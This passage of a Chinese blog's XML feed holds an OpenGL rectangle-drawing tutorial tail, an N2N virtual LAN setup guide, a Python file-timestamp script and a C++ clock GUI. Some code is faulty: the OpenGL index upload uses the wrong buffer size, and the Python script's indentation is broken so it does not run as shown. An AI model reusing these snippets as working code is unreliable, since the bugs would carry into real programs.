<span class="keyword">int</span> indices[] = &#123; <span class="comment">// 注意索引从0开始! </span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="comment">// 第一个三角形</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>  <span class="comment">// 第二个三角形</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> VAO, VBO, EBO;</span><br><span class="line">    glGenVertexArrays(<span class="number">1</span>, &amp;VAO);</span><br><span class="line">    glGenBuffers(<span class="number">1</span>, &amp;VBO);</span><br><span class="line">    glGenBuffers(<span class="number">1</span>, &amp;EBO);</span><br><span class="line">    <span class="comment">// 首先绑定顶点数组对象（VAO），然后绑定并设置顶点缓冲区，然后配置顶点属性。</span></span><br><span class="line">    glBindVertexArray(VAO);</span><br><span class="line"></span><br><span class="line">    glBindBuffer(GL_ARRAY_BUFFER, VBO);</span><br><span class="line">    glBufferData(GL_ARRAY_BUFFER, <span class="keyword">sizeof</span>(vertices), vertices, GL_STATIC_DRAW);</span><br><span class="line"></span><br><span class="line">    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);</span><br><span class="line">    glBufferData(GL_ELEMENT_ARRAY_BUFFER, <span class="keyword">sizeof</span>(vertices), indices, GL_STATIC_DRAW);</span><br><span class="line"></span><br><span class="line">    glVertexAttribPointer(<span class="number">0</span>, <span class="number">3</span>, GL_FLOAT, GL_FALSE, <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">float</span>), (<span class="keyword">void</span>*)<span class="number">0</span>);</span><br><span class="line">    glEnableVertexAttribArray(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 请注意，对glVertexAttribPointer的调用将VBO注册为顶点属性的绑定顶点缓冲区对象是允许的。</span></span><br><span class="line">    <span class="comment">// 因此之后我们可以安全地解除绑定。</span></span><br><span class="line">    glBindBuffer(GL_ARRAY_BUFFER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 之后可以取消绑定VAO，这样其他VAO调用就不会意外修改此VAO，但这很少发生。</span></span><br><span class="line">    <span class="comment">// 无论如何，修改其他VAO都需要调用glBindVertexArray，因此通常在不直接需要时，我们不会取消绑定VAO（或VBO）。</span></span><br><span class="line">    glBindVertexArray(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取消注释此调用以绘制线框多边形。</span></span><br><span class="line">    <span class="comment">//glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 渲染循环中</span></span><br><span class="line">    <span class="comment">// -----------</span></span><br><span class="line">    <span class="keyword">while</span> (!glfwWindowShouldClose(window))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 输入</span></span><br><span class="line">        <span class="comment">// -----</span></span><br><span class="line">        processInput(window);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 渲染</span></span><br><span class="line">        <span class="comment">// ------</span></span><br><span class="line">        glClearColor(<span class="number">0.2f</span>, <span class="number">0.3f</span>, <span class="number">0.3f</span>, <span class="number">1.0f</span>);</span><br><span class="line">        glClear(GL_COLOR_BUFFER_BIT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 画图</span></span><br><span class="line">        glUseProgram(shaderProgram);</span><br><span class="line">        <span class="comment">// 因为只有一个VAO，因此不必每次都绑定它，但是我们这样做是为了使事情更有条理。</span></span><br><span class="line">        glBindVertexArray(VAO);</span><br><span class="line">        glDrawElements(GL_TRIANGLES, <span class="number">6</span>, GL_UNSIGNED_INT,<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// glBindVertexArray(0); // 无需每次都解除绑定。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// glfw: 交换缓冲区，轮询IO事件（按下/释放，鼠标移动）。</span></span><br><span class="line">        <span class="comment">// -------------------------------------------------------------------------------</span></span><br><span class="line">        glfwSwapBuffers(window);</span><br><span class="line">        glfwPollEvents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可选: 一旦超出其目标，则取消分配所有资源。</span></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------------</span></span><br><span class="line">    glDeleteVertexArrays(<span class="number">1</span>, &amp;VAO);</span><br><span class="line">    glDeleteBuffers(<span class="number">1</span>, &amp;VBO);</span><br><span class="line">    glDeleteBuffers(<span class="number">1</span>, &amp;EBO);</span><br><span class="line">    glDeleteProgram(shaderProgram);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// glfw: 终止并清除所有先前分配的GLFW资源。</span></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------</span></span><br><span class="line">    glfwTerminate();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理所有输: 查询GLFW是否在此框架中 按下/释放 了相关按键并作出相应反应。</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processInput</span><span class="params">(GLFWwindow* window)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当按下Esc时，窗口关闭。</span></span><br><span class="line">    <span class="keyword">if</span> (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS)</span><br><span class="line">        glfwSetWindowShouldClose(window, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glfw: 当改变窗口大小时，该回调函数被执行。</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">framebuffer_size_callback</span><span class="params">(GLFWwindow* window, <span class="keyword">int</span> width, <span class="keyword">int</span> height)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 确保视口与新窗口维度相匹配，注意宽高将明显大于视网膜显示屏的宽高。</span></span><br><span class="line">    glViewport(<span class="number">0</span>, <span class="number">0</span>, width, height);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;</summary>
      
    
    
    
    <category term="计算机图形学" scheme="https://blog.todest.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"/>
    
    <category term="OpenGL" scheme="https://blog.todest.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/OpenGL/"/>
    
    
    <category term="OpenGL" scheme="https://blog.todest.cn/tags/OpenGL/"/>
    
    <category term="GLSL" scheme="https://blog.todest.cn/tags/GLSL/"/>
    
  </entry>
  
  <entry>
    <title>N2N构建虚拟局域网</title>
    <link href="https://blog.todest.cn/post/81bd05cb/"/>
    <id>https://blog.todest.cn/post/81bd05cb/</id>
    <published>2020-05-10T06:02:50.000Z</published>
    <updated>2020-05-11T09:50:02.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>N2N是一款开源的P2P软件，可以用来构建虚拟局域网，也就是说，每个N2N虚拟网络內的用户都可以通过N2N网络访问其他用户主机，即相互ping通。</p><h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p><strong>Supernode 超级节点：</strong>它在Edge节点间建立握手，或为Edge节点中转数据。能够直通的节点间通讯是P2P的，则由超级节点注册网络路径，超级节点一旦帮助双方完成首次握手，剩余的数据流就会在两个Edge节点间传送，而无需超级节点介入。如果有一方Edge节点的NAT属于对称型（symmetrical），超级节点还需继续为双方提供数据转发服务。<br><strong>Edge 节点：</strong>用户主机上用以与建立N2N网络的软件。几乎每个Edge节点都需建立一个tun/tap虚拟网卡设备，作为接入N2N网络的入口。<br><a id="more"></a></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong>地址</strong></p><ul><li>v1: <a href="https://github.com/meyerd/n2n/tree/master/n2n_v1">https://github.com/meyerd/n2n/tree/master/n2n_v1</a></li><li>v2: <a href="https://github.com/ntop/n2n">https://github.com/ntop/n2n</a></li><li>v2.1(v2s): <a href="https://github.com/meyerd/n2n/tree/master/n2n_v2">https://github.com/meyerd/n2n/tree/master/n2n_v2</a> 非官方版本，与官方的 v2 不兼容</li><li>安卓版本: <a href="https://github.com/switch-iot/hin2n">https://github.com/switch-iot/hin2n</a> (最新版本支持v1、v2、v2s)</li><li>网友编译的主程序：<a href="https://github.com/lucktu/n2n">https://github.com/lucktu/n2n</a></li></ul><p>由于v2s版本直连概率比较高，所以本文只介绍v2s版本。同时服务端使用 ubuntu，客户端使用 windows。</p><p><strong>安装方法</strong><br>先从服务端开始，在ubuntu上从github下载源码进行编译安装，由此获得两个可执行文件，supernode和edge。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/meyerd/n2n</span><br><span class="line"><span class="built_in">cd</span> n2n/n2n_v2</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><br>然后服务端运行supernode，服务端防火墙记得开放UDP监听端口，这里假设UDP监听端口为1234。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supernode -l 1234</span><br></pre></td></tr></table></figure><br>接下来创建DHCP服务器。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install isc-dhcp-server</span><br><span class="line">```bash</span><br><span class="line"></span><br><span class="line">配置 `/etc/dhcp/dhcpd.conf`，写入以下内容，也可以找到相应位置，取消注释，然后修改内容.</span><br><span class="line">```bash</span><br><span class="line">ddns-update-style interim;</span><br><span class="line">ignore client-updates;</span><br><span class="line">default-lease-time 604800;</span><br><span class="line">max-lease-time 1209600;</span><br><span class="line"></span><br><span class="line">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">    option subnet-mask 255.255.255.0;</span><br><span class="line">    range dynamic-bootp 10.0.0.10 10.0.0.100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>编辑<code>/etc/default/isc-dhcp-server</code>，添加一行。假设虚拟网卡名为tun0。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INTERFACES=<span class="string">&quot;tun0&quot;</span></span><br></pre></td></tr></table></figure><br>然后启动DHCP服务，可以使用<code>dhclient tun0</code>测试是否从DHCP服务器获取到IP。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service isc-dhcp-server start</span><br></pre></td></tr></table></figure><br>接下来配置服务端Edge节点，创建DHCP服务器用得着，否则也可以不用配置。<br>假设设定的n2n网络IP为10.0.0.1，如果需要可以加上<code>-k 自定义加密key值</code>。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edge -d tun0 -a 10.0.0.1 -l 127.0.0.1:1234</span><br></pre></td></tr></table></figure><br>上面步骤会创建名为tun0的虚拟网卡，如果创建失败，可以按照下面方法手动创建。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install uml-utilities</span><br><span class="line">tunctl -t tun0</span><br></pre></td></tr></table></figure><br>这样，其他Edge节点启动后就可以由10.0.0.1分配IP地址。<br>windows客户端直接下载编译好的EXE文件，或是自行从github仓库下载源码编译。<br>同时，windows需先安装tap-window虚拟网卡软件。<br>然后在命令行（管理员模式）运行，注意中文路径及特殊符号路径。<br>以下为DHCP获取IP地址的指令。（不知道为什么，我每次DHCP启动或关闭都会断网一瞬间）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edge -r -a dhcp:10.0.0.1 -l 服务端IP:1234</span><br></pre></td></tr></table></figure><br>以下为以指定IP（10.0.0.2）启动，各个Edge节点指定IP启动的IP需各不相同。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edge -a 10.0.0.2 -l 服务端IP:1234</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;N2N是一款开源的P2P软件，可以用来构建虚拟局域网，也就是说，每个N2N虚拟网络內的用户都可以通过N2N网络访问其他用户主机，即相互ping通。&lt;/p&gt;
&lt;h1 id=&quot;架构&quot;&gt;&lt;a href=&quot;#架构&quot; class=&quot;headerlink&quot; title=&quot;架构&quot;&gt;&lt;/a&gt;架构&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Supernode 超级节点：&lt;/strong&gt;它在Edge节点间建立握手，或为Edge节点中转数据。能够直通的节点间通讯是P2P的，则由超级节点注册网络路径，超级节点一旦帮助双方完成首次握手，剩余的数据流就会在两个Edge节点间传送，而无需超级节点介入。如果有一方Edge节点的NAT属于对称型（symmetrical），超级节点还需继续为双方提供数据转发服务。&lt;br&gt;&lt;strong&gt;Edge 节点：&lt;/strong&gt;用户主机上用以与建立N2N网络的软件。几乎每个Edge节点都需建立一个tun/tap虚拟网卡设备，作为接入N2N网络的入口。&lt;br&gt;</summary>
    
    
    
    <category term="计算机网络" scheme="https://blog.todest.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="虚拟局域网" scheme="https://blog.todest.cn/tags/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/"/>
    
    <category term="N2N" scheme="https://blog.todest.cn/tags/N2N/"/>
    
  </entry>
  
  <entry>
    <title>Python修改文件时间</title>
    <link href="https://blog.todest.cn/post/56e638c7/"/>
    <id>https://blog.todest.cn/post/56e638c7/</id>
    <published>2020-04-08T10:34:05.000Z</published>
    <updated>2020-05-11T09:40:49.778Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> win32file <span class="keyword">import</span> CreateFile, SetFileTime, GetFileTime, CloseHandle</span><br><span class="line"><span class="keyword">from</span> win32file <span class="keyword">import</span> GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING</span><br><span class="line"><span class="keyword">from</span> pywintypes <span class="keyword">import</span> Time<span class="comment">#忽略此处报错，不影响运行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyFileTime</span>(<span class="params">filePath, createTime, modifyTime, accessTime, offset</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用来修改任意文件的相关时间属性，时间格式：YYYY-MM-DD HH:MM:SS 例如：2019-02-02 00:01:02</span></span><br><span class="line"><span class="string">    :param filePath: 文件路径名</span></span><br><span class="line"><span class="string">    :param createTime: 创建时间</span></span><br><span class="line"><span class="string">    :param modifyTime: 修改时间</span></span><br><span class="line"><span class="string">    :param accessTime: 访问时间</span></span><br><span class="line"><span class="string">    :param offset: 时间偏移的秒数,tuple格式，顺序和参数时间对应</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    format = <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>  <span class="comment"># 时间格式</span></span><br><span class="line">    cTime_t = timeOffsetAndStruct(createTime, format, offset[<span class="number">0</span>])</span><br><span class="line">    mTime_t = timeOffsetAndStruct(modifyTime, format, offset[<span class="number">1</span>])</span><br><span class="line">    aTime_t = timeOffsetAndStruct(accessTime, format, offset[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    fh = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">None</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    createTimes, accessTimes, modifyTimes = GetFileTime(fh)</span><br><span class="line"></span><br><span class="line">    createTimes = Time(time.mktime(cTime_t))</span><br><span class="line">    accessTimes = Time(time.mktime(aTime_t))</span><br><span class="line">    modifyTimes = Time(time.mktime(mTime_t))</span><br><span class="line">    SetFileTime(fh, createTimes, accessTimes, modifyTimes)</span><br><span class="line">    CloseHandle(fh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeOffsetAndStruct</span>(<span class="params">times, format, offset</span>):</span></span><br><span class="line">    <span class="keyword">return</span> time.localtime(time.mktime(time.strptime(times, format)) + offset)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&#x27;F:\\Blog\\source\\_posts&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        filepath = root + <span class="string">&#x27;\\&#x27;</span> + file</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">用来获取任意文件的相关时间属性</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">        ctime = str(datetime.fromtimestamp(os.path.getctime(filepath)))[:<span class="number">19</span>]</span><br><span class="line">        mtime = str(datetime.fromtimestamp(os.path.getmtime(filepath)))[:<span class="number">19</span>]</span><br><span class="line">        atime = str(datetime.fromtimestamp(os.path.getatime(filepath)))[:<span class="number">19</span>]</span><br><span class="line">        </span><br><span class="line">modifyFileTime(filepath, ctime, mtime, atime, offset)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Clock</title>
    <link href="https://blog.todest.cn/post/7fba9196/"/>
    <id>https://blog.todest.cn/post/7fba9196/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:33:15.040Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>C++编写的Clocl GUI</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;graphics.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> posx = <span class="number">240</span>, posy = <span class="number">240</span>, R = <span class="number">170</span>;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">24</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">point</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> rad, <span class="keyword">bool</span> xy)</span><span class="comment">//获取偏移点坐标</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> x = posx, y = posy;</span><br><span class="line"><span class="keyword">if</span> (xy)<span class="keyword">return</span> (<span class="keyword">int</span>)(y - r * <span class="built_in">cos</span>(rad* PI / <span class="number">180</span>));</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>)(x + r * <span class="built_in">sin</span>(rad* PI / <span class="number">180</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//更新</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbkcolor(EGERGB(<span class="number">30</span>, <span class="number">30</span>, <span class="number">30</span>));</span><br><span class="line">setlinewidth(<span class="number">3</span>); setcolor(EGERGB(<span class="number">64</span>, <span class="number">0</span>, <span class="number">128</span>));</span><br><span class="line">circle(posx, posy, R + <span class="number">16</span>); circle(posx, posy, R + <span class="number">14</span>); circle(posx, posy, R + <span class="number">12</span>); circle(posx, posy, R + <span class="number">10</span>);</span><br><span class="line">setlinewidth(<span class="number">1</span>); setcolor(EGERGB(<span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">60</span>; i++)<span class="comment">//刻度</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">5</span>)line(point(R + <span class="number">2</span>, i * <span class="number">6</span>, <span class="number">0</span>), point(R + <span class="number">2</span>, i * <span class="number">6</span>, <span class="number">1</span>), point(R + <span class="number">9</span>, i * <span class="number">6</span>, <span class="number">0</span>), point(R + <span class="number">9</span>, i * <span class="number">6</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">else</span> line(point(R - <span class="number">4</span>, i * <span class="number">6</span>, <span class="number">0</span>), point(R - <span class="number">4</span>, i * <span class="number">6</span>, <span class="number">1</span>), point(R + <span class="number">9</span>, i * <span class="number">6</span>, <span class="number">0</span>), point(R + <span class="number">9</span>, i * <span class="number">6</span>, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">setcolor(EGERGB(<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>)); setfont(<span class="number">18</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">12</span>; i++)<span class="comment">//读数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(str, <span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">outtextrect(point(R - <span class="number">8</span>, i * <span class="number">30</span>, <span class="number">0</span>) - <span class="number">5</span>, point(R - <span class="number">8</span>, i * <span class="number">30</span>, <span class="number">1</span>) - <span class="number">5</span>, point(R - <span class="number">8</span>, i * <span class="number">30</span>, <span class="number">0</span>) + <span class="number">5</span>, point(R - <span class="number">8</span>, i * <span class="number">30</span>, <span class="number">1</span>) + <span class="number">5</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">time_t</span> t_now; time(&amp;t_now); tm* t = localtime(&amp;t_now);<span class="comment">//获取系统时间</span></span><br><span class="line"><span class="built_in">sprintf</span>(str, <span class="string">&quot;%04d/%02d/%02d %02d:%02d:%02d&quot;</span>, t-&gt;tm_year + <span class="number">1900</span>, t-&gt;tm_mon + <span class="number">1</span>, t-&gt;tm_mday, t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec);</span><br><span class="line">setlinewidth(<span class="number">8</span>); setcolor(BLUE);</span><br><span class="line">line(posx, posy, point(R - <span class="number">80</span>, t-&gt;tm_hour % <span class="number">12</span> * <span class="number">30</span>, <span class="number">0</span>), point(R - <span class="number">80</span>, t-&gt;tm_hour % <span class="number">12</span> * <span class="number">30</span> + t-&gt;tm_min / <span class="number">12</span>, <span class="number">1</span>));<span class="comment">//时针</span></span><br><span class="line">setlinewidth(<span class="number">4</span>); setcolor(RED);</span><br><span class="line">line(posx, posy, point(R - <span class="number">40</span>, t-&gt;tm_min * <span class="number">6</span>, <span class="number">0</span>), point(R - <span class="number">40</span>, t-&gt;tm_min * <span class="number">6</span>, <span class="number">1</span>));<span class="comment">//分针</span></span><br><span class="line">setlinewidth(<span class="number">2</span>); setcolor(YELLOW);</span><br><span class="line">line(posx, posy, point(R - <span class="number">10</span>, t-&gt;tm_sec * <span class="number">6</span>, <span class="number">0</span>), point(R - <span class="number">10</span>, t-&gt;tm_sec * <span class="number">6</span>, <span class="number">1</span>));<span class="comment">//秒针</span></span><br><span class="line">setfillcolor(YELLOW); fillellipse(posx, posy, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">setcolor(GREEN); setfont(<span class="number">30</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>); outtextxy(<span class="number">95</span>, <span class="number">500</span>, str);<span class="comment">//数字时钟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">initgraph(<span class="number">480</span>, <span class="number">640</span>);<span class="comment">//初始化画布</span></span><br><span class="line"><span class="keyword">for</span> (; !kbhit(); delay_fps(<span class="number">60</span>))</span><br><span class="line">&#123;</span><br><span class="line">cleardevice();<span class="comment">//清除画布</span></span><br><span class="line">loop();<span class="comment">//更新</span></span><br><span class="line">&#125;</span><br><span class="line">closegraph();<span class="comment">//关闭画布</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;C++编写的Clocl GUI&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/spa</summary>
      
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
